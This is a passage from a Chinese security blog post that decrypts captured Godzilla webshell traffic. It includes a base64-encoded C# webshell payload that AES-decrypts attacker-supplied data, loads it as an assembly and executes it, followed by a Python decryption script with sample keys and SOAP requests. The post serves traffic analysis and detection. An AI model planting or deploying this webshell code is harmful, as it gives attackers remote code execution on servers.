LCAiIik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBkYXRhID0gU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhhcHBjb250ZXh0LlJlcXVlc3RbcGFzc10pOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgYXNzZW1ibHkgPSBhcHBjb250ZXh0LkFwcGxpY2F0aW9uLkdldChjb29raWVWYWx1ZSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChhc3NlbWJseSA9PSBudWxsKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgY29va2llID0gbmV3IEh0dHBDb29raWUoY29va2llTmFtZSwgU3lzdGVtLkd1aWQuTmV3R3VpZCgpLlRvU3RyaW5nKCJOIikpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29va2llVmFsdWUgPSBjb29raWUuVmFsdWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcHBjb250ZXh0LlJlc3BvbnNlLkNvb2tpZXMuQWRkKGNvb2tpZSk7DQogICAgICAgICAgICAgICAgCQkJCQlhc3NlbWJseSA9IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5LkxvYWQobmV3IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUmlqbmRhZWxNYW5hZ2VkKCkuQ3JlYXRlRGVjcnlwdG9yKFN5c3RlbS5UZXh0LkVuY29kaW5nLkRlZmF1bHQuR2V0Qnl0ZXMoa2V5KSwgU3lzdGVtLlRleHQuRW5jb2RpbmcuRGVmYXVsdC5HZXRCeXRlcyhrZXkpKS5UcmFuc2Zvcm1GaW5hbEJsb2NrKGRhdGEsIDAsIGRhdGEuTGVuZ3RoKSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcHBjb250ZXh0LkFwcGxpY2F0aW9uLlNldChjb29raWVWYWx1ZSwgYXNzZW1ibHkpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIG8gPSBhc3NlbWJseS5DcmVhdGVJbnN0YW5jZSgiTFkiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBvdXRTdHJlYW0gPSBuZXcgU3lzdGVtLklPLk1lbW9yeVN0cmVhbSgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgby5FcXVhbHMob3V0U3RyZWFtKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG8uRXF1YWxzKGFwcGNvbnRleHQpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgby5FcXVhbHMobmV3IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUmlqbmRhZWxNYW5hZ2VkKCkuQ3JlYXRlRGVjcnlwdG9yKFN5c3RlbS5UZXh0LkVuY29kaW5nLkRlZmF1bHQuR2V0Qnl0ZXMoa2V5KSwgU3lzdGVtLlRleHQuRW5jb2RpbmcuRGVmYXVsdC5HZXRCeXRlcyhrZXkpKS5UcmFuc2Zvcm1GaW5hbEJsb2NrKGRhdGEsIDAsIGRhdGEuTGVuZ3RoKSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvLlRvU3RyaW5nKCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgciA9IG91dFN0cmVhbS5Ub0FycmF5KCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvdXRTdHJlYW0uRGlzcG9zZSgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXBwY29udGV4dC5SZXNwb25zZS5Xcml0ZShtZDUuU3Vic3RyaW5nKDAsIDE2KSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcHBjb250ZXh0LlJlc3BvbnNlLldyaXRlKFN5c3RlbS5Db252ZXJ0LlRvQmFzZTY0U3RyaW5nKG5ldyBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlJpam5kYWVsTWFuYWdlZCgpLkNyZWF0ZUVuY3J5cHRvcihTeXN0ZW0uVGV4dC5FbmNvZGluZy5EZWZhdWx0LkdldEJ5dGVzKGtleSksIFN5c3RlbS5UZXh0LkVuY29kaW5nLkRlZmF1bHQuR2V0Qnl0ZXMoa2V5KSkuVHJhbnNmb3JtRmluYWxCbG9jayhyLCAwLCByLkxlbmd0aCkpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFwcGNvbnRleHQuUmVzcG9uc2UuV3JpdGUobWQ1LlN1YnN0cmluZygxNikpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7DQogICAgICAgICAgICAgICAgfQ0K%27%29%29%29%2C%27unsafe%27%29%3B&amp;key=WwSelqL9JENiXyh3FQxhh6neBpd6CFz4tFjBohtMq8pX0MY0w6%2F1Gkg4dxy5JO9o&#x27;)</span><br><span class="line">    # print(data)</span><br><span class="line">    # data = decrypter.decrypt_res_payload(</span><br><span class="line">    #     b&#x27;72A9C691CCDAAB98CRF8Fju8YJWYsacdj2S9hlrsxeDHV8GSkLM/jS9ONlU=B4C4E1F6DDD2A488&#x27;)</span><br><span class="line">    # print(data)</span><br><span class="line"></span><br><span class="line">    decrypter = CSHAP_ASMX_AES_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class="line">    asmx_req = b&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">    &lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class="line">      &lt;soap:Body&gt;</span><br><span class="line">        &lt;pass xmlns=&quot;http://tempuri.org/&quot;&gt;</span><br><span class="line">          &lt;pass&gt;WwSelqL9JENiXyh3FQxhh6neBpd6CFz4tFjBohtMq8pX0MY0w6%2F1Gkg4dxy5JO9o&lt;/pass&gt;</span><br><span class="line">        &lt;/pass&gt;</span><br><span class="line">      &lt;/soap:Body&gt;</span><br><span class="line">    &lt;/soap:Envelope&gt;&#x27;&#x27;&#x27;</span><br><span class="line">    asmx_res = b&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;&lt;soap:Body&gt;&lt;passResponse xmlns=&quot;http://tempuri.org/&quot;&gt;&lt;passResult&gt;11CD6A8758984163CRF8Fju8YJWYsacdj2S9hlrsxeDHV8GSkLM/jS9ONlU=6C37AC826A2A04BC&lt;/passResult&gt;&lt;/passResponse&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;&#x27;&#x27;&#x27;</span><br><span class="line">    data = decrypter.decrypt_req_payload(asmx_req)</span><br><span class="line">    print(data)</span><br><span class="line">    data = decrypter.decrypt_res_payload(asmx_res)</span><br><span class="line">    print(data)</span><br><span class="line">    # decrypter = CSHAP_AES_RAW(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class="line">    # cshap_aes_raw_req=&#x27;5b049e96a2fd2443625f2877150c6187a9de06977a085cf8b458c1a21b4cabca57d0c634c3aff51a4838771cb924ef68&#x27;</span><br><span class="line">    # cshap_aes_raw_res = &#x27;09117c163bbc609598b1a71d8f64bd865aecc5e0c757c19290b33f8d2f4e3655&#x27;</span><br><span class="line">    # data = decrypter.decrypt_req_payload(bytes(bytearray.fromhex(cshap_aes_raw_req)))</span><br><span class="line">    # print(data)</span><br><span class="line">    # data = decrypter.decrypt_res_payload(bytes(bytearray.fromhex(cshap_aes_raw_res)))</span><br><span class="line">    # print(data)</span><br></pre></td></tr></table></figure>

<p>找到如下模块，填入参数，进行解密，请求体的数据可以看得出来如何解密，相应的函数都给了，主要是利用脚本解密响应体的数据</p>
<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F48a84a26-3b70-4790-be77-ea4d19aa9c6b%2FUntitled.png?table=block&id=6c95afc7-71e5-4033-a81c-b53d2f748a4c&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2" alt="Untitled"></p>
<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F1ba28d89-3df0-404a-9929-2affaceba736%2FUntitled.png?table=block&id=f5d4552d-9f61-43ad-9b58-117b0997de6e&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2" alt="Untitled"></p>
<pre><code>&lt;?php
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
</code></pre>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2023/09/11/SICTF-%E6%B1%AA%E6%B1%AA%E9%98%9FWP/" rel="prev" title="SICTF_汪汪队WP">
      <i class="fa fa-chevron-left"></i> SICTF_汪汪队WP
    </a></div>
      <div class="post-nav-item">
    <a href="/2023/10/05/spring%E5%86%85%E5%AD%98%E9%A9%AC/" rel="next" title="spring内存马">
      spring内存马 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#CobalStrike%E6%B5%81%E9%87%8F-beacon%E6%A8%A1%E5%BC%8F"><span class="nav-number">1.</span> <span class="nav-text">*CobalStrike流量-beacon模式*</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%EF%BC%88%E4%B8%80%E4%BA%9B%E6%99%AE%E9%81%8D%E4%BD%86%E4%B8%8D%E7%BB%9D%E5%AF%B9%E7%9A%84%E7%89%B9%E5%BE%81%EF%BC%89"><span class="nav-number">1.1.</span> <span class="nav-text">流量特征（一些普遍但不绝对的特征）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%B0%E8%9D%8E%E6%B5%81%E9%87%8F"><span class="nav-number">2.</span> <span class="nav-text">冰蝎流量</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%B0%E8%9D%8Ephp"><span class="nav-number">2.1.</span> <span class="nav-text">冰蝎php</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%B0%E8%9D%8Ejava"><span class="nav-number">2.2.</span> <span class="nav-text">冰蝎java</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">2.3.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89%E6%B5%81%E9%87%8F%EF%BC%884-0%EF%BC%89"><span class="nav-number">3.</span> <span class="nav-text">哥斯拉流量（4.0）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%B9%E5%BE%81"><span class="nav-number">3.1.</span> <span class="nav-text">特征</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E5%AF%86"><span class="nav-number">3.2.</span> <span class="nav-text">解密</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">John Doe</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">57</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">John Doe</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
